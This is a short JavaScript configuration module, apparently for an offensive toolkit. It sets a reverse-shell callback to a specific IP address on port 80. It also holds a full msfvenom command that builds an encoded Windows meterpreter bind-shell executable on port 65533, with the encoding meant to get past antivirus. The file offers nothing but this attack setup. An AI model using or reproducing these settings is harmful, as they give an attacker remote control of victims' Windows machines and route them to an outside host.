module.exports = {
	reverShell:{ip:"162.219.126.11", port:80},
	noWwwBind:
	   {
	   	 win:"msfvenom --platform windows x86/shikata_ga_nai -b '\\x00' -i 8 -f exe -p windows/meterpreter/bind_tcp RHOST=0.0.0.0 LPORT=65533  -o payload/noWWW_P65533.exe"}
};
